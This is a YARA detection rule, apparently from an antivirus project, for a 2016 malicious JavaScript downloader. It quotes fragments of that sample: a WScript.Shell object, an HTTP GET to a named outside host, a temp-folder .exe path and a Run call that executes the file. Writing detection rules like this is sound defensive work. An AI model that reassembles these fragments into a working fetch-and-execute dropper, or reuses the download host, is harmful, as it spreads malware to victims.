rule sig_20160330_0395f7eb045a978df1cb3fa3389f7787 {
  meta:
    description = "datamaliciousorder - file 20160330_0395f7eb045a978df1cb3fa3389f7787.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "33b7c86fa5b775186acf63233f0dd2f047ebdfb3f745343519acb32b84ff75ce"

  strings:
    $s1  = "var WX = function P() {return WScript[N](\"WScript\"+\".Shell\");}(), G = 11;" fullword ascii
    $s2  = "JO[VD](\"GET\", \"http://ekotrade.pl/m4ujda\", false);" fullword ascii
    $s3  = "function UY(P1, YH){D = D * 1; return P1 - YH;};" fullword ascii
    $s4  = "if (JO[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function LQ(){return V0 + \"\";};" fullword ascii
    $s6  = "function TG() {return WX[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"0P9NIcmJ.ex\" + \"e\";};" fullword ascii
    $s7  = "function Z() {return ((X == true) && (X == UD)) ? 1 : D;};" fullword ascii
    $s8  = "function RU(J){WX[\"Run\"](J, D, D);};" fullword ascii
    $s9  = "var A = new this[\"Date\"]();" fullword ascii
    $s10 = "return UY(A0, FN);" fullword ascii
    $s11 = "function RW(){return 22;};" fullword ascii
    $s12 = "function LJ(V) {var IP = (1, 2, 3, 4, 5, V); return IP;};" fullword ascii
    $s13 = "function I(){return N;};" fullword ascii
    $s14 = "}while (Y);" fullword ascii
    $s15 = "function TL()" fullword ascii
    $s16 = "var P0 = false;" fullword ascii
    $s17 = "var UD = false;" fullword ascii
    $s18 = "UD = true; " fullword ascii
    $s19 = "} catch(IB){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}